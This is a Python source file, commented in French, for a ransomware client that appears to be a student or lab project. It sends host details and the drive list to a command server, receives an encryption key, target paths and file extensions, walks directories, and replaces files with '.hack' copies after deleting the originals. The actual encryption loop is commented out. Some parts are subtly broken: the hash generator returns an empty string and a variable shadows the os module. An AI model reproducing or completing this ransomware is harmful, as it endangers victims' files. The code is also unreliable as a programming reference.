import os
import string
import utile.network as network
import utile.message as message
import utile.config as config
from platform import node, win32_edition, system
from time import time
from hashlib import sha256
from re import search
from os import path
import random
import shutil

# Constantes
DEBUG_MODE = False
AES_GCM = True
PORT_SERV_FRONTAL = 8381
LAST_STATE = None


def initialize():
    """
    Procédure d'initialisation du ransomware
    :return: Néant
    """
    global LAST_STATE

    # Vérifie si un hash est enregistré, sinon génère un hash
    hash = config.get_config('HASH')
    if hash is None:
        hash = simulate_hash()
        config.set_config('HASH', hash)
        config.save_config('config/ransomware.cfg', 'config/ransomware.bin')
    # Détermine le type d'OS
    os = os_type()
    if os is None:
        print("pas un windows")  # Si l'OS n'est pas un Microsoft Windows sortie du Ransomware

    # Détermine les disques disponibles
    disks = list_disks()

    # Construction du message d'initialisation du RANSOMWARE
    msg = message.set_message("initialize_req", [hash, os, disks])
    # Sauvegarde des paramètres d'initialisation du Ransomware
    config.set_config('OS', os)
    config.set_config('DISKS', disks)
    config.save_config('config/ransomware.cfg', 'config/ransomware.bin')

    # Connection vers le serveur frontal
    conn_frontal = network.connect_to_serv(port=PORT_SERV_FRONTAL)

    # Envoi de la demande d'initialisation vers le serveur frontal
    network.send_message(conn_frontal, msg)
    print("Le message : " + str(msg) + "est envoyé")

    # Réception de la configuration
    msg = network.receive_message(conn_frontal)
    msg_type = message.get_message_type(msg)
    if msg_type == 'INITIALIZE_RESP':
        # Fermeture de la connexion avec le serveur frontal
        conn_frontal.close()

        # Sauvegarde de la configuration réceptionnée
        config.set_config('ID_DB', msg['CONFIGURE'])
        config.set_config('DISKS', msg['SETTING']['DISKS'])
        config.set_config('PATHS', msg['SETTING']['PATHS'])
        config.set_config('FILE_EXT', msg['SETTING']['FILE_EXT'])
        config.set_config('FREQ', msg['SETTING']['FREQ'])
        config.set_config('LAST_STATE', 'INITIALIZE')  # Signifie que la configuration est complète
        config.save_config('config/ransomware.cfg', 'config/ransomware.bin')
        # /!\ PAS DE SAUVEGARDE DE LA CLE DE CHIFFREMENT SUR DISQUE /!\
        key_ransomware = msg['SETTING']['KEY']
        # Changement d'état du ransomware
        LAST_STATE = 'INITIALIZE'


def os_type():
    """
    Retourne le type d'operating system
    :return: None si le système n'est pas un microsoft windows ou (str) "SERVER" ou "WORKSTATION"
    """
    if search("[Ww]indows", system()):
        if search("[Ss]erver", win32_edition()):
            return "SERVER"
        else:
            return "WORKSTATION"
    return None


def list_disks():
    alphabet = 'abcdefghijklmnopqrstuvwxyz'
    # return ['%s:' % d for d in dl if path.exists('%s:' % d)]
    disks = ''
    for lettre in alphabet.upper():
        if path.exists('%s:' % lettre):
            if disks != '':
                disks += ','
            disks += f'{lettre}:'
    return disks


def explore(chemin):
    contenu = []
    if not os.path.exists(chemin):
        print("Le chemin spécifié n'existe pas.")
        return contenu

    for element in os.listdir(chemin):
        chemin_complet = os.path.join(chemin, element)
        contenu.append(chemin_complet)
        if os.path.isdir(chemin_complet):
            contenu.extend(explore(chemin_complet))
    return contenu


def file_type(fichier):
    if os.path.isdir(fichier):
        return "dir"
    else:
        return os.path.splitext(fichier)[1]


def chiffre(fichier_source):
    if not os.path.exists(fichier_source):
        print("Le fichier spécifié n'existe pas.")
        return

    if not os.path.isfile(fichier_source):
        print("Le chemin spécifié ne correspond pas à un fichier.")
        return

    # Obtient le nom du fichier sans extension
    nom_fichier, extension = os.path.splitext(fichier_source)
    # Crée le nouveau nom de fichier avec l'extension .hack
    fichier_cible = nom_fichier + ".hack"

    # Copie le contenu du fichier source vers le fichier cible
    shutil.copyfile(fichier_source, fichier_cible)
    print(f"Fichier copié de {fichier_source} vers {fichier_cible}")

    # Supprime le fichier source
    os.remove(fichier_source)
    print(f"Fichier source {fichier_source} supprimé.")


def simulate_hash(longueur=0):
    letters = string.hexdigits
    return ''.join(random.choice(letters) for i in range(longueur))


def main():
    global AES_GCM
    global DEBUG_MODE
    global IP_SERV_FRONTAL
    global PORT_SERV_FRONTAL
    global LAST_STATE

    # Load configuration
    # config.load_config('config/ransomware.cfg', 'config/ransomware.bin')
    # AES_GCM = config.get_config('AES_GCM')
    # DEBUG_MODE = config.get_config('DEBUG_MODE')
    # IP_SERV_FRONTAL = config.get_config('IP_SERV_FRONTAL')
    # PORT_SERV_FRONTAL = int(config.get_config('PORT_SERV_FRONTAL'))

    # Vérifie le dernier état sauvegardé
    LAST_STATE = config.get_config('LAST_STATE')
    if LAST_STATE is None:
        initialize()

    if LAST_STATE == 'INITIALIZE' or LAST_STATE == 'CRYPT' or LAST_STATE == 'PENDING':
        # state_config = config.get_config('LAST_STATE')
        # if state_config != "INITIALIZE" and state_config != "CRYPT" and state_config != "PENDING":
        #     return None
        #
        # disks = config.get_config('DISKS')
        # paths = config.get_config('PATHS')
        # file_ext = config.get_config('FILE_EXT')
        # nb_files_encrypted = config.get_config('NB_FILES_ENCRYPTED')
        # if nb_files_encrypted is None:
        #     nb_files_encrypted = 0
        #
        # for disk in disks:
        #     os.chdir(disk)
        #     for folder_path in paths:
        #         for (root, dirs, files) in os.walk(folder_path, topdown=True):
        #             for filename in files:
        #                 if os.path.splitext(filename)[1] in file_ext:  # Si l'extension est dans les types à chiffrer
        #                     nb_files_encrypted += chiffre(f"{root}\{filename}")
        #     print(f"Le ransomware a chiffré {nb_files_encrypted} fichiers.")
        print("ok")


if __name__ == '__main__':
    main()
